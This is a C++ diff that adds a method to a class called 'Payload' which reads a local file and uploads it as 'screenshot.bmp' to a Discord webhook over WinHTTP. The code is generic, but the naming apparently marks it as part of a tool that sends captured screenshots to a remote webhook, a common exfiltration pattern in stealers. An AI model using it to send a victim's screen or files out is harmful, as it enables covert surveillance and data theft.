@@ -1,4 +1,7 @@
 ﻿#include "Payload.hpp"
+#include <fstream>
+#include "../../Module/Logger.hpp"
+
 
 bool Payload::SendMessage(const std::string& webhook_url, const std::string& message) {
     nlohmann::json payload = {
@@ -137,6 +140,115 @@ bool Payload::SendWebhookRequest(const std::string& webhook_url, const std::stri
     WinHttpCloseHandle(hSession);
 
     return true;
+}
+
+bool Payload::SendFile(const std::string& webhook_url, const std::string& message, const std::string& file_path) {
+    try {
+        // Create boundary
+        std::string boundary = "------------------------" + std::to_string(std::time(nullptr));
+
+        // Read image
+        std::ifstream file(file_path, std::ios::binary | std::ios::ate);
+        if (!file.is_open()) {
+            throw std::runtime_error("Failed to open file: " + file_path);
+        }
+
+        auto fileSize = file.tellg();
+        file.seekg(0);
+        std::vector<char> fileData(fileSize);
+        file.read(fileData.data(), fileSize);
+        file.close();
+
+        // Create multipart/form-data
+        std::ostringstream payloadStream;
+        payloadStream << "--" << boundary << "\r\n"
+            << "Content-Disposition: form-data; name=\"payload_json\"\r\n"
+            << "Content-Type: application/json\r\n\r\n"
+            << "{\"content\":\"" << message << "\"}\r\n"
+            << "--" << boundary << "\r\n"
+            << "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\n"
+            << "Content-Type: image/bmp\r\n\r\n";
+        std::string payloadStart = payloadStream.str();
+        std::string payloadEnd = "\r\n--" + boundary + "--\r\n";
+
+        std::vector<char> payload(payloadStart.begin(), payloadStart.end());
+        payload.insert(payload.end(), fileData.begin(), fileData.end());
+        payload.insert(payload.end(), payloadEnd.begin(), payloadEnd.end());
+
+        // Set WinHttp
+        std::wstring wide_url = StringToWString(webhook_url);
+        HINTERNET hSession = WinHttpOpen(L"Discord Webhook Client",
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            WINHTTP_NO_PROXY_NAME,
+            WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession) throw std::runtime_error("Failed to open WinHttp session");
+
+        // Split URL
+        URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
+        urlComp.dwSchemeLength = -1;
+        urlComp.dwHostNameLength = -1;
+        urlComp.dwUrlPathLength = -1;
+
+        if (!WinHttpCrackUrl(wide_url.c_str(), 0, 0, &urlComp)) {
+            WinHttpCloseHandle(hSession);
+            throw std::runtime_error("Failed to parse URL");
+        }
+
+        // Create connection
+        HINTERNET hConnect = WinHttpConnect(hSession,
+            std::wstring(urlComp.lpszHostName, urlComp.dwHostNameLength).c_str(),
+            urlComp.nPort, 0);
+        if (!hConnect) {
+            WinHttpCloseHandle(hSession);
+            throw std::runtime_error("Failed to open connection");
+        }
+
+        // Create request
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
+            std::wstring(urlComp.lpszUrlPath, urlComp.dwUrlPathLength).c_str(),
+            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+        if (!hRequest) {
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            throw std::runtime_error("Failed to open request");
+        }
+
+        // Add headers
+        std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + StringToWString(boundary);
+        if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            throw std::runtime_error("Failed to add headers");
+        }
+
+        // Send request
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            payload.data(), payload.size(), payload.size(), 0)) {
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            throw std::runtime_error("Failed to send request");
+        }
+
+        if (!WinHttpReceiveResponse(hRequest, NULL)) {
+            WinHttpCloseHandle(hRequest);
+            WinHttpCloseHandle(hConnect);
+            WinHttpCloseHandle(hSession);
+            throw std::runtime_error("Failed to receive response");
+        }
+
+        // Close handle
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+
+        return true;
+    }
+    catch (const std::exception& e) {
+        Logger::getInstance()->expection(std::string("Error in SendFile: ") + e.what());
+        return false;
+    }
 }
 
 std::wstring Payload::StringToWString(const std::string& str) {
